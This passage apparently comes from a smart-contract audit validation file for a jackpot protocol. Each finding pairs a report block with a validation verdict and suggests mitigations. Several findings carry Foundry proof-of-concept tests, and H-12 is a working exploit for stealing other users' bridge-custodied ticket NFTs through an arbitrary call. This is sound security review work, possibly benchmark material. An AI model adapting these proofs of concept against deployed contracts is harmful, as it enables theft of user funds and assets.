1. Drawing 1 is due. 2. Anyone calls runJackpot, locking drawing 1 and creating a pending request at entropy provider E1. 3. Governance updates entropy to E2 for future requests before E1 fulfills. 4. E1 calls back with the pending randomness. 5. onlyEntropy rejects E1 because the global entropy is now E2, so settlement cannot complete.

## Proof of Code
pragma solidity ^0.8.28; import "forge-std/Test.sol"; import "../contracts/Jackpot.sol"; import "../contracts/interfaces/IScaledEntropyProvider.sol"; contract EntropyMock is IScaledEntropyProvider { function requestAndCallbackScaledRandomness(uint32,SetRequest[] memory,bytes4,bytes memory) external payable returns(uint64){return 1;} function getFee(uint32) external pure returns(uint256){return 0;} function fulfill(Jackpot j) external { uint256[][] memory r=new uint256[][](2); r[0]=new uint256[](5); r[0][0]=1; r[0][1]=2; r[0][2]=3; r[0][3]=4; r[0][4]=5; r[1]=new uint256[](1); r[1][0]=1; j.scaledEntropyCallback(bytes32(0),r,""); } } contract JackpotEntropyHarness is Jackpot { constructor() Jackpot(1,5,1,1e17,0,0,0,0,0,1e6,1,0) {} function seed(address e) external { entropy=IScaledEntropyProvider(e); currentDrawingId=1; drawingState[1].drawingTime=0; drawingState[1].ballMax=5; drawingState[1].bonusballMax=1; } } contract EntropyDriftPoC is Test { function testOldEntropyCannotSettleAfterUpdate() public { EntropyMock e1=new EntropyMock(); EntropyMock e2=new EntropyMock(); JackpotEntropyHarness jackpot=new JackpotEntropyHarness(); jackpot.seed(address(e1)); jackpot.runJackpot(); jackpot.setEntropy(e2); vm.expectRevert(); e1.fulfill(jackpot); assertEq(jackpot.getDrawingState(1).jackpotLock,true); } }

## Suggested Mitigation
Snapshot the entropy provider for each pending drawing/request and authorize the callback against that snapshot. Block `setEntropy` while the current drawing is locked, or require an explicit migration/cancel path that unlocks or reissues the pending request safely.
```

### Current Validated Block
### M-11 / `PPrrZKotDc61i9N4tnTCl`
- Finding Title: Changing entropy while a drawing is pending bricks the original callback and leaves the jackpot locked
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-authority-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The request-time entropy contract is not bound to the locked drawing, while `setEntropy` can change the live authorization address. A future-intended entropy change during a pending request makes the original callback unauthorized and blocks normal settlement. This is an in-scope liveness failure from global parameter drift.
- Code Evidence: `contracts/Jackpot.sol::runJackpot` locks and requests through `entropy`; `contracts/Jackpot.sol::setEntropy` has no locked-drawing guard; `scaledEntropyCallback` uses `onlyEntropy`, which checks the live global pointer.

## H-12 / `kjDblGFEXt_ejozdhDT3K`
- Finding title: Arbitrary bridge call lets a winning ticket holder steal other users' custodied ticket NFTs
- Report lines: 1198-1248

### Original Report Block
```md
## [H-12]. Arbitrary bridge call lets a winning ticket holder steal other users' custodied ticket NFTs

## id: kjDblGFEXt_ejozdhDT3K

## Derived From Pattern/Invariant
ArbitraryExternalCall

## Exploit Type
ArbitraryExternalCall

## Location
JackpotBridgeManager.claimWinnings/_bridgeFunds

## Finding Status: Valid
### Finding Status Justification: claimWinnings validates only the signer's claimed ticket IDs, then _bridgeFunds executes signer-controlled to.call(data) from JackpotBridgeManager. Since the manager is ERC721 owner of bridge-custodied tickets, a winning claimant can call JackpotTicketNFT.safeTransferFrom(address(this), attackerReceiver, victimTicketId). The USDC balance-delta check can be satisfied via the receiver spending the approved claimed amount. No allowlist, target blocklist, or custody invariant prevents this path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`claimWinnings` only proves that the signer owns the tickets being claimed, but `_bridgeFunds` then executes fully user-controlled calldata from the manager itself: `if (_bridgeDetails.approveTo != address(0)) { usdc.approve(_bridgeDetails.approveTo, _claimedAmount); } (bool success,) = _bridgeDetails.to.call(_bridgeDetails.data); ... if (preUSDCBalance - postUSDCBalance != _claimedAmount) revert NotAllFundsBridged();`. A claimant can set `to` to the Jackpot ticket NFT and call `safeTransferFrom(address(this), attackerReceiver, victimTicketId)`. Because the call is made by the bridge manager, it is authorized as the ERC721 owner of every bridge-custodied ticket. The receiver hook can then use the freshly granted USDC allowance to pull exactly `_claimedAmount`, satisfying the balance-delta check while the victim NFT remains stolen and `ticketOwner[victimTicketId]` is stale.

## Impact
Any user with a claimable winning bridge ticket can steal arbitrary bridge-custodied ticket NFTs belonging to other users. Stolen tickets can later be claimed locally by the attacker or held for future winnings, causing direct loss of user assets.

## Proof of Concept
1. Victim buys a ticket through `JackpotBridgeManager`, so the NFT owner is the manager and `ticketOwner[victimTicketId] = victim`. 2. Attacker buys or obtains a separate winning bridge ticket. 3. Attacker signs `ClaimWinningsData` for only the attacker's ticket, with `approveTo = attackerReceiver`, `to = jackpotTicketNFT`, and calldata for `safeTransferFrom(manager, attackerReceiver, victimTicketId)`. 4. `_bridgeFunds` approves the receiver for the attacker's claimed USDC, transfers the victim NFT as the manager, and the receiver hook pulls exactly the claimed USDC. 5. The exact USDC balance-delta check passes, leaving the victim ticket stolen.

## Proof of Code
// Foundry-style PoC core assertion
function testClaimWinningsArbitraryCallStealsVictimTicket() public {
    uint256 attackerPk = 0xA11CE;
    address attacker = vm.addr(attackerPk);
    uint256 victimTicketId = _buyBridgeTicket(victim);
    uint256 attackerTicketId = _buyBridgeTicket(attacker);
    jackpot.setClaimAmount(100e6);
    StealReceiver receiver = new StealReceiver(usdc, address(manager), attacker, 100e6);
    uint256[] memory ids = new uint256[](1);
    ids[0] = attackerTicketId;
    JackpotBridgeManager.RelayTxData memory route = JackpotBridgeManager.RelayTxData({approveTo: address(receiver), to: address(ticketNFT), data: abi.encodeWithSelector(bytes4(keccak256("safeTransferFrom(address,address,uint256)")), address(manager), address(receiver), victimTicketId)});
    bytes32 digest = manager.createClaimWinningsEIP712Hash(ids, route);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
    manager.claimWinnings(ids, route, abi.encodePacked(r, s, v));
    assertEq(ticketNFT.ownerOf(victimTicketId), address(receiver));
    assertEq(usdc.balanceOf(attacker), 100e6);
}

## Suggested Mitigation
Do not allow arbitrary calls from the custody contract. Use an allowlist of audited bridge adapters and selectors, enforce that calls cannot target the ticket NFT or other protocol assets, and prefer adapter interfaces that only pull the claimed USDC amount. If arbitrary routes must remain, execute them from a minimal per-claim escrow that never owns other users' tickets or funds.
```

### Current Validated Block
### H-12 / `kjDblGFEXt_ejozdhDT3K`
- Finding Title: Arbitrary bridge call lets a winning ticket holder steal other users' custodied ticket NFTs
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: High
- Root Cause Family: `bridge-arbitrary-call-custody`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: A claimant can use their own valid winning bridge ticket to make `_bridgeFunds` execute arbitrary calldata from the bridge manager, which is the ERC-721 owner of all bridge-custodied tickets. Calling the ticket NFT to transfer a victim ticket is authorized at the NFT layer, and the USDC balance-delta check can be satisfied by spending the claimant's approved winnings during the receiver hook. This creates direct theft of unrelated users' custodied ticket NFTs and any attached future or settled value.
- Code Evidence: `contracts/JackpotBridgeManager.sol::claimWinnings` validates only the claimant's listed ticket IDs. `_bridgeFunds` then calls arbitrary `_bridgeDetails.to.call(_bridgeDetails.data)` from the manager. `JackpotBridgeManager.buyTickets` mints all bridge tickets to `address(this)`, so the manager is authorized for `JackpotTicketNFT.safeTransferFrom` on unrelated custodied tickets.

## M-14 / `RJM_fI7cXw-dK2wVfx0Xs`
- Finding title: Mid-drawing payout calculator update causes active drawing to settle with zero stored payouts
- Report lines: 1342-1431

### Original Report Block
```md
## [M-14]. Mid-drawing payout calculator update causes active drawing to settle with zero stored payouts

## id: RJM_fI7cXw-dK2wVfx0Xs

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
GlobalParamMidFlowManipulation

## Location
Jackpot / GuaranteedMinimumPayoutCalculator.setPayoutCalculator / calculateAndStoreDrawingUserWinnings

## Finding Status: Valid
### Finding Status Justification: A routine payout calculator replacement for future drawings can affect the active drawing because settlement uses the live pointer and the new calculator has no snapshot. The scope explicitly calls out mid-drawing admin parameter changes as an in-scope fairness/accounting risk.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`Jackpot` snapshots payout parameters for a drawing by calling `payoutCalculator.setDrawingTierInfo(currentDrawingId)` only when `_setNewDrawingState()` initializes that drawing. However, settlement later reads the live global `payoutCalculator` address. If governance rotates `payoutCalculator` during an active drawing, the new calculator has no `drawingTierInfo[currentDrawingId]` snapshot. `GuaranteedMinimumPayoutCalculator.calculateAndStoreDrawingUserWinnings()` then uses the default zero-valued struct and stores zero payouts for every tier instead of reverting. Vulnerable snippets: `function setPayoutCalculator(IPayoutCalculator _payoutCalculator) external onlyOwner { ... payoutCalculator = _payoutCalculator; }`; later `drawingUserWinnings = payoutCalculator.calculateAndStoreDrawingUserWinnings(currentDrawingId, _currentDrawingState.prizePool, ...)`; and in the calculator, `DrawingTierInfo storage tierInfo = drawingTierInfo[_drawingId];` with no initialized flag check. This violates the stated state-machine invariant that payout calculation must only execute after that drawing's tier info has been snapshotted.

## Impact
All winners in the active drawing can be paid 0 even with a nonzero prize pool and winning tickets. The jackpot settles successfully, LP accounting treats user winnings as zero, and users' winning ticket claims later burn tickets for no payout. Because this is triggered by a normal admin upgrade path rather than malicious arbitrary withdrawal, severity is Medium under the privileged-role rubric.

## Proof of Concept
1. A drawing is initialized and the current payout calculator snapshots drawingTierInfo[d]. 2. Users buy tickets for drawing d. 3. Before `runJackpot()` settles d, governance calls `setPayoutCalculator(newCalculator)` where `newCalculator` is a valid `GuaranteedMinimumPayoutCalculator` configured for the same Jackpot but has never snapshotted drawing d. 4. Entropy callback settles drawing d through the new calculator. 5. The new calculator reads default zero `drawingTierInfo[d]`, stores no meaningful tier payouts, and returns `totalPayout == 0`. 6. Winning users claim tickets and receive 0 USDC despite a nonzero prize pool.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../contracts/GuaranteedMinimumPayoutCalculator.sol";

contract PayoutCalculatorMissingSnapshotPoC is Test {
    address jackpot = address(0xBEEF);

    function _weights() internal pure returns (uint256[12] memory w) {
        w[11] = 1e18;
    }

    function _minTiers() internal pure returns (bool[12] memory t) {
        t[11] = true;
    }

    function testNewCalculatorWithoutDrawingSnapshotReturnsZeroPayout() external {
        GuaranteedMinimumPayoutCalculator oldCalc = new GuaranteedMinimumPayoutCalculator(
            IJackpot(jackpot),
            1e6,
            0,
            _minTiers(),
            _weights()
        );

        uint256 drawingId = 1;
        vm.prank(jackpot);
        oldCalc.setDrawingTierInfo(drawingId);

        GuaranteedMinimumPayoutCalculator newCalc = new GuaranteedMinimumPayoutCalculator(
            IJackpot(jackpot),
            1e6,
            0,
            _minTiers(),
            _weights()
        );

        uint256[] memory uniqueResult = new uint256[](12);
        uint256[] memory dupResult = new uint256[](12);
        uniqueResult[11] = 1;

        vm.prank(jackpot);
        uint256 totalPayout = newCalc.calculateAndStoreDrawingUserWinnings(
            drawingId,
            100e6,
            5,
            1,
            uniqueResult,
            dupResult
        );

        assertEq(totalPayout, 0);
        assertEq(newCalc.getTierPayout(drawingId, 11), 0);
    }
}

## Suggested Mitigation
Snapshot the payout calculator address per drawing, e.g. store `drawingState[currentDrawingId].payoutCalculator` during `_setNewDrawingState()` and use that stored address for settlement and claims. Alternatively, make `setPayoutCalculator()` update only future drawings and reject changes while the current drawing is active/unsolved. In `GuaranteedMinimumPayoutCalculator`, add a per-drawing initialized flag set by `setDrawingTierInfo()` and revert in `calculateAndStoreDrawingUserWinnings()` if the drawing was not snapshotted.
```

### Current Validated Block
### M-14 / `RJM_fI7cXw-dK2wVfx0Xs`
- Finding Title: Mid-drawing payout calculator update causes active drawing to settle with zero stored payouts
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `payout-calculator-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Replacing `payoutCalculator` during an active drawing can make settlement use a calculator that never snapshotted that drawing's tier configuration. The fresh calculator's default `DrawingTierInfo` makes all tier weights and minimum tiers zero, so winners can be assigned zero stored payouts. The docs and scope treat future-only global changes and mid-drawing effects as security-relevant.
- Code Evidence: `contracts/Jackpot.sol::setPayoutCalculator` mutates the global pointer only. `GuaranteedMinimumPayoutCalculator::calculateAndStoreDrawingUserWinnings` reads `drawingTierInfo[_drawingId]` without an initialized flag and skips every tier when the snapshot is default zero.

## M-17 / `EjJJ7I_tm_zeL_HoMTLjP`
- Finding title: ECDSA-only bridge authorization permanently locks tickets owned by ERC-1271 smart wallets
- Report lines: 1502-1544

### Original Report Block
```md
## [M-17]. ECDSA-only bridge authorization permanently locks tickets owned by ERC-1271 smart wallets

## id: EjJJ7I_tm_zeL_HoMTLjP

## Derived From Pattern/Invariant
EIP1271ByPass

## Exploit Type
StandardViolation

## Location
JackpotBridgeManager.claimTickets, claimWinnings

## Finding Status: Valid
### Finding Status Justification: JackpotBridgeManager.buyTickets records any nonzero _recipient as ticketOwner. Both claim paths derive signer solely with ECDSA.recover and pass that address to _validateTicketOwnership. Contract wallets authorize via ERC-1271 rather than signatures recovering to the contract address, and the code has no ERC-1271 fallback or contract-recipient rejection. Thus smart-wallet-owned bridge tickets have no working authorization path.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
buyTickets allows any nonzero _recipient to become the internal ticketOwner, including smart contract wallets. However both claim paths recover an EOA with ECDSA.recover and compare that recovered address directly to ticketOwner. ERC-1271 contract signatures are never checked. Vulnerable snippet: address signer = ECDSA.recover(eipHash, _signature); _validateTicketOwnership(_ticketIds, signer); and _validateTicketOwnership requires ticketOwner[ticketId] == _signer. A Safe or account-abstraction wallet recorded as ticketOwner cannot produce an ECDSA signature that recovers to its own contract address, so the bridge manager will reject every claim and transfer attempt for those tickets.

## Impact
Bridge-custodied tickets and any associated winnings are permanently locked for smart wallet recipients because the NFT remains held by JackpotBridgeManager and no alternate recovery path exists.

## Proof of Concept
1. A permissionless purchaser calls buyTickets with a smart wallet as _recipient. 2. The manager records ticketOwner[ticketId] = smartWallet. 3. The smart wallet owner signs the EIP-712 digest and the smart wallet would return the ERC-1271 magic value for that digest. 4. JackpotBridgeManager ignores isValidSignature and uses ECDSA.recover, which returns the owner EOA, not the smart wallet contract. 5. _validateTicketOwnership reverts because ticketOwner[ticketId] is the smart wallet contract.

## Proof of Code
pragma solidity ^0.8.28;
import "forge-std/Test.sol";
import "../contracts/JackpotBridgeManager.sol";
import "@openzeppelin/contracts/interfaces/IERC1271.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
contract MockUSDC1271 is ERC20 { constructor() ERC20("USDC","USDC") {} }
contract ZeroPriceJackpot is IJackpot { uint256 public override ticketPrice; uint256 public override currentDrawingId = 1; function buyTickets(Ticket[] memory tickets,address,address[] memory,uint256[] memory,bytes32) external pure returns (uint256[] memory ids) { ids = new uint256[](tickets.length); for (uint256 i; i < tickets.length; i++) ids[i] = 777 + i; } function claimWinnings(uint256[] memory) external {} function getUnpackedTicket(uint256,uint256) external pure returns (uint8[] memory,uint8) { return (new uint8[](0),0); } }
contract SmartWallet1271 is IERC1271 { address public owner; bytes4 constant MAGIC = 0x1626ba7e; constructor(address o){ owner=o; } function isValidSignature(bytes32, bytes memory) external pure returns (bytes4) { return MAGIC; } }
contract ERC1271LockPoC is Test { function testSmartWalletRecipientCannotClaimBridgeTicket() external { uint256 ownerPk = 0xB0B; address owner = vm.addr(ownerPk); SmartWallet1271 wallet = new SmartWallet1271(owner); MockUSDC1271 usdc = new MockUSDC1271(); ZeroPriceJackpot jackpot = new ZeroPriceJackpot(); JackpotBridgeManager manager = new JackpotBridgeManager(IJackpot(address(jackpot)), IJackpotTicketNFT(address(0)), IERC20(address(usdc)), "MegaPotBridge", "1"); IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1); tickets[0].normals = new uint8[](5); uint256[] memory ids = manager.buyTickets(tickets, address(wallet), new address[](0), new uint256[](0), bytes32(0)); bytes32 digest = manager.createClaimTicketEIP712Hash(ids, owner); (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, digest); bytes memory sig = abi.encodePacked(r,s,v); vm.expectRevert(); manager.claimTickets(ids, owner, sig); assertEq(manager.ticketOwner(ids[0]), address(wallet)); } }

## Suggested Mitigation
Support ERC-1271 for contract ticket owners. If ticketOwner[ticketId].code.length > 0, call IERC1271(owner).isValidSignature(digest, signature) and require the magic value. Alternatively reject contract recipients in buyTickets so tickets cannot be assigned to addresses that cannot authorize claims.
```

### Current Validated Block
### M-17 / `EjJJ7I_tm_zeL_HoMTLjP`
- Finding Title: ECDSA-only bridge authorization permanently locks tickets owned by ERC-1271 smart wallets
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `erc1271-unsupported`
- Checklist Gates Passed: `Stage0, scope, supported-behavior, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: The bridge records contract recipients as owners but validates only ECDSA-recovered EOAs for both ticket withdrawal and winnings claims. A smart wallet cannot satisfy `ticketOwner[ticketId] == recoveredEOA`, and the manager has no alternate path to release or claim those custodied tickets. This can materially lock bridge tickets and attached winnings for accepted recipients.
- Code Evidence: `contracts/JackpotBridgeManager.sol::buyTickets` stores `_recipient` in `ticketOwner` with no contract-wallet restriction. `claimTickets` and `claimWinnings` use `ECDSA.recover` and `_validateTicketOwnership`; there is no ERC-1271 validation path.

## M-18 / `oZQ2pM2T1ltePA70cdJcZ`
- Finding title: Changing entropy providers can overwrite pending randomness requests with colliding sequence IDs
- Report lines: 1545-1584

### Original Report Block
```md
## [M-18]. Changing entropy providers can overwrite pending randomness requests with colliding sequence IDs

## id: oZQ2pM2T1ltePA70cdJcZ

## Derived From Pattern/Invariant
ExternalProtocolKeyCollision: pending external request IDs are keyed without provider/source

## Exploit Type
ExternalProtocolKeyCollision

## Location
ScaledEntropyProvider.setEntropyProvider/requestAndCallbackScaledRandomness

## Finding Status: Valid
### Finding Status Justification: Although provider rotation is owner-only, the setter is documented as affecting future requests only. The unscoped sequence key can corrupt pending requests after a valid provider migration, so this is not merely admin misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
`ScaledEntropyProvider` stores pending callbacks as `mapping(uint64 => PendingRequest) private pending`, but Pyth sequence numbers are provider-scoped. `setEntropyProvider` can change the provider while old requests remain pending, and a new provider can return the same sequence number. `_storePendingRequest(sequence, ...)` then overwrites the old request because the key omits the provider. The callback also ignores the provider argument: `function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override`.

## Impact
A normal provider rotation can corrupt or erase an active jackpot randomness request. A colliding request can replace the jackpot callback with another caller's callback, leaving the jackpot locked and forcing emergency recovery, or delivering randomness to the wrong consumer context.

## Proof of Concept
1. Jackpot requests entropy through provider A and gets sequence 1; `pending[1]` points to Jackpot. 2. Owner rotates `ScaledEntropyProvider` to provider B before A fulfills. 3. An attacker or other consumer requests randomness through provider B, which also returns sequence 1. 4. `_storePendingRequest` overwrites `pending[1]`. 5. Provider A's fulfillment no longer has the original Jackpot pending request, so the drawing cannot settle correctly.

## Proof of Code
pragma solidity ^0.8.28;
import {Test} from "forge-std/Test.sol";
import {ScaledEntropyProvider} from "../contracts/ScaledEntropyProvider.sol";
import {IScaledEntropyProvider} from "../contracts/interfaces/IScaledEntropyProvider.sol";
contract MockEntropyV2 { mapping(address => uint64) public seq; function requestV2(address provider, uint32) external payable returns (uint64) { seq[provider] += 1; return seq[provider]; } function getFeeV2(address, uint32) external pure returns (uint256) { return 0; } }
contract EntropyKeyCollisionPoC is Test { function _req(ScaledEntropyProvider p, address caller) internal { IScaledEntropyProvider.SetRequest[] memory r = new IScaledEntropyProvider.SetRequest[](1); r[0] = IScaledEntropyProvider.SetRequest({samples:1,minRange:1,maxRange:10,withReplacement:false}); vm.prank(caller); p.requestAndCallbackScaledRandomness(0, r, bytes4(keccak256("cb(uint64,uint256[][],bytes)")), ""); } function testProviderScopedSequenceCollisionOverwritesPending() public { address providerA = address(0xA); address providerB = address(0xB); address jackpot = address(0xCAFE); address attacker = address(0xBEEF); MockEntropyV2 entropy = new MockEntropyV2(); ScaledEntropyProvider p = new ScaledEntropyProvider(address(entropy), providerA); _req(p, jackpot); assertEq(p.getPendingRequest(1).callback, jackpot); p.setEntropyProvider(providerB); _req(p, attacker); assertEq(p.getPendingRequest(1).callback, attacker); } }

## Suggested Mitigation
Key pending requests by a composite key such as `keccak256(abi.encode(provider, sequence))`, store the provider in `PendingRequest`, and verify the callback provider matches the stored provider. Prevent provider changes while any requests are pending or add an explicit migration/abandon flow.
```

### Current Validated Block
### M-18 / `oZQ2pM2T1ltePA70cdJcZ`
- Finding Title: Changing entropy providers can overwrite pending randomness requests with colliding sequence IDs
- Decision: Valid
- Confidence: Med
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `entropy-provider-sequence-collision`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: `ScaledEntropyProvider` documents provider updates as future-only, but pending requests are keyed only by `sequence` while Pyth V2 callbacks include a provider argument. After a valid owner provider rotation, a request through the new provider can reuse the old provider's sequence and overwrite the pending callback. That exposes an in-flight Jackpot request to misdelivery or loss through a normal migration plus permissionless later request.
- Code Evidence: `contracts/ScaledEntropyProvider.sol` stores `mapping(uint64 => PendingRequest) private pending`, writes in `_storePendingRequest(sequence, ...)`, and ignores the `provider` argument in `entropyCallback(uint64 sequence, address /*provider*/, ...)`. `setEntropyProvider` has no pending-request guard.

## M-20 / `p2_DN-XODOvXu_tNksgej`
- Finding title: Bridge ticket purchases use live global ticketPrice instead of the active drawing price, causing overcharges or purchase DoS
- Report lines: 1620-1713

### Original Report Block
```md
## [M-20]. Bridge ticket purchases use live global ticketPrice instead of the active drawing price, causing overcharges or purchase DoS

## id: p2_DN-XODOvXu_tNksgej

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
### Finding Status Justification: The scope specifically calls out ticketPrice/global parameter changes mid-drawing. A valid price update for future drawings creates a live-vs-snapshotted price mismatch in the bridge path, so treating it only as governance risk is not valid.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresAdminRole


## Description
JackpotBridgeManager quotes bridge purchases with the live Jackpot.ticketPrice() getter, but Jackpot.buyTickets charges the active drawing snapshot stored in drawingState[currentDrawingId].ticketPrice. If governance legitimately updates the global ticketPrice during an active drawing for future drawings, bridge purchases diverge from direct Jackpot purchases. Vulnerable snippet: `uint256 ticketPrice = jackpot.ticketPrice(); ... uint256 ticketCost = ticketPrice * _tickets.length; usdc.safeTransferFrom(msg.sender, address(this), ticketCost); usdc.approve(address(jackpot), ticketCost); uint256[] memory ticketIds = jackpot.buyTickets(...)`. In Jackpot.buyTickets the charged amount is instead `numTicketsBought * currentDrawingState.ticketPrice`. If the live global price is higher, bridge users transfer excess USDC to the manager and only the lower active-drawing price is spent, leaving the surplus stuck because the manager has no sweep/refund. If the live global price is lower, the manager underfunds and under-approves Jackpot, so all bridge purchases revert until the next drawing.

## Impact
Bridge users can be overcharged with real USDC permanently stuck in JackpotBridgeManager, or bridge ticket purchases can be functionally unavailable for the rest of the active drawing after a legitimate ticket price update.

## Proof of Concept
1. Drawing N starts with snapshotted ticket price of 10 USDC. 2. Governance legitimately calls setTicketPrice(20 USDC) during drawing N to configure the next drawing. 3. A bridge purchaser calls JackpotBridgeManager.buyTickets for one ticket. 4. The bridge manager pulls and approves 20 USDC using the live global getter. 5. Jackpot.buyTickets charges only drawing N's snapshotted 10 USDC. 6. The bridge manager records the ticket, but 10 USDC remains stranded in the bridge manager with no refund or sweep path. The inverse update to a lower global price causes Jackpot.buyTickets to revert due to insufficient bridge-manager funding/allowance.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "../contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    uint256 public override totalSupply;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function approve(address spender, uint256 amount) external override returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external override returns (bool) { balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MockJackpot is IJackpot {
    IERC20 public token;
    uint256 public override ticketPrice;
    uint256 public activeDrawingTicketPrice;
    uint256 public override currentDrawingId = 1;
    constructor(IERC20 _token, uint256 _activePrice, uint256 _globalPrice) { token = _token; activeDrawingTicketPrice = _activePrice; ticketPrice = _globalPrice; }
    function buyTickets(Ticket[] memory tickets, address, address[] memory, uint256[] memory, bytes32) external override returns (uint256[] memory ids) {
        token.transferFrom(msg.sender, address(this), activeDrawingTicketPrice * tickets.length);
        ids = new uint256[](tickets.length);
        for (uint256 i; i < tickets.length; i++) ids[i] = i + 1;
    }
    function claimWinnings(uint256[] memory) external override {}
    function getUnpackedTicket(uint256, uint256) external pure override returns (uint8[] memory, uint8) { return (new uint8[](0), 0); }
}

contract BridgePriceDriftPoC is Test {
    function testBridgeOverchargesWhenGlobalTicketPriceExceedsActiveDrawingPrice() external {
        MockUSDC usdc = new MockUSDC();
        MockJackpot jackpot = new MockJackpot(IERC20(address(usdc)), 10e6, 20e6);
        JackpotBridgeManager manager = new JackpotBridgeManager(IJackpot(address(jackpot)), IJackpotTicketNFT(address(0xBEEF)), IERC20(address(usdc)), "Bridge", "1");
        address buyer = address(0xA11CE);
        usdc.mint(buyer, 20e6);
        vm.prank(buyer);
        usdc.approve(address(manager), 20e6);
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1);
        tickets[0].normals = new uint8[](5);
        tickets[0].bonusball = 1;
        vm.prank(buyer);
        manager.buyTickets(tickets, buyer, new address[](0), new uint256[](0), bytes32(0));
        assertEq(usdc.balanceOf(address(jackpot)), 10e6);
        assertEq(usdc.balanceOf(address(manager)), 10e6);
        assertEq(usdc.balanceOf(buyer), 0);
    }
}

## Suggested Mitigation
Quote the same snapshotted price Jackpot will charge. Add an interface method exposing the active drawing's ticket price, or have Jackpot.buyTickets pull directly from the original buyer using an exact expected cost returned by Jackpot. Refund any post-purchase surplus and approve only the exact active-drawing cost.
```

### Current Validated Block
### M-20 / `p2_DN-XODOvXu_tNksgej`
- Finding Title: Bridge ticket purchases use live global ticketPrice instead of the active drawing price, causing overcharges or purchase DoS
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Medium
- Root Cause Family: `bridge-ticket-price-drift`
- Checklist Gates Passed: `Stage0, scope, root-cause, safeguards, exploitability, impact`
- Checklist Gates Failed: `-`
- Detailed Reason: Drawing ticket price is snapshotted in `drawingState`, but the bridge manager charges callers using the live global `jackpot.ticketPrice()`. A governance price update intended for future drawings can make bridge users overpay into the manager when the global price is higher, or make bridge purchases revert when the global price is lower than the active drawing's snapshotted price. This is exactly the mid-drawing global-parameter drift class highlighted by the benchmark.
- Code Evidence: `contracts/JackpotBridgeManager.sol::buyTickets` computes `ticketCost = jackpot.ticketPrice() * _tickets.length` and transfers that amount. `contracts/Jackpot.sol::buyTickets` charges `ticketsValue = numTicketsBought * currentDrawingState.ticketPrice`, while `_setNewDrawingState` snapshots the global `ticketPrice` per drawing.

## M-23 / `XboZ6rstW75a7OfO7LUPg`
- Finding title: Pending LP deposits can be rounded to zero after accumulator inflation
- Report lines: 1795-1909

### Original Report Block
```md
## [M-23]. Pending LP deposits can be rounded to zero after accumulator inflation

## id: XboZ6rstW75a7OfO7LUPg

## Derived From Pattern/Invariant
ERC4626SharePriceMismatch

## Exploit Type
ERC4626SharePrice

## Location
JackpotLPManager._consolidateDeposits

## Finding Status: Valid
### Finding Status Justification: This duplicates the accumulator-inflation deposit-loss root cause and is supported by the code. _consolidateDeposits converts a prior-round pending deposit with floor division and deletes the deposit unconditionally. processDrawingSettlement can raise drawingAccumulator based on postDrawLpValue / currentLP.lpPoolTotal, and processDeposit has no min-share constraint. If the accumulator exceeds deposit * 1e18, the depositor receives zero shares. Solidity 0.8 checks do not help because this is truncation, not overflow. No code path refunds or preserves the deposit when zero shares are minted. The exploit path is permissionless under low-liquidity conditions.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
